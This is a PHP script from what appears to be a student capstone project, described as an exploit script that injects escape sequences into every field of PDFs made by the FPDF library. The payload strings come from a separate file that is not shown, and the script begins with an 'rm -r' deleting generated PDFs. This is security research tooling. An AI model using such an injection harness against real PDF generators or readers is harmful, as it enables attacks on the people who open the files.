<!-- File: injection.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (PDF injection & Image Escape) for fPDFs -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';
use Fpdf\Fpdf;

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
    $pdf = new FPDF();
    // Required to set a Font
    $pdf->SetFont('Arial','B',16);
    $pdf->SetCompression(false);

    $pdf->AddPage();
	return $pdf;
}

// Creator
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetCreator($seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/creator'.$i.'.pdf');
    $i++;
}

// Title
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetTitle($seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/title'.$i.'.pdf');
    $i++;
}

// Author
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetAuthor($seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/author'.$i.'.pdf');
    $i++;
}

// Subject
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetSubject($seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/subject'.$i.'.pdf');
    $i++;
}

// Keywords
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->SetKeywords($seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/keywords'.$i.'.pdf');
    $i++;
}

// Link
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Link(35, 35, 10, 10, $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/link'.$i.'.pdf');
    $i++;
}

// Text
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Text(50, 50, $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/text'.$i.'.pdf');
    $i++;
}

// Write
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Write(120, $seq, $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/write'.$i.'.pdf');
    $i++;
}
// Cell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Cell(40, 10, $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/cell'.$i.'.pdf');
    $i++;
}

// MultiCell
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->MultiCell(20, 20, $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/multicell'.$i.'.pdf');
    $i++;
}

// Image Streams
$i = 0;
$path = "/var/www/myapp/images";
if ($handle = opendir($path)) {
    while (false !== ($file = readdir($handle))) {
        if ('.' === $file) continue;
        if ('..' === $file) continue;
        $pdf = createPDF();

        // Get Extension of Image
        $ext_option = "";
        $ext = explode(".", $file);
        $ext = strtolower($ext[count($ext) - 1]);
        if ($ext == "jpeg") {
            $ext_option = "JPEG";
        }
        elseif ($ext == "png") {
            $ext_option = "PNG";
        }
        elseif ($ext == "jpg") {
            $ext_option = "JPG";
        }
        else {
            $ext_option = "JPG";
        }

        $pdf->Image("/var/www/myapp/images/".$file, 60, 30, 90, 0, $ext_option, "http://localhost");
        $pdf->Text(100, 100, "DOGTEST");
		$pdf->Output('F', '/var/www/myapp/pdfs/image'.$i.'.pdf');
        $i++;
    }
    closedir($handle);
}

// Image Links
$i = 0;
foreach ($escape_seq as $seq) {
    $pdf = createPDF();
    $pdf->Image("/var/www/myapp/images/xref.jpg", 60, 30, 90, 0, 'JPG', $seq);
    $pdf->Text(100, 100, "DOGTEST");
    $pdf->Output('F', '/var/www/myapp/pdfs/linkimage'.$i.'.pdf');
    $i++;
}

?>
<h1 style="text-align:center;">PDF Injection Complete!</h1>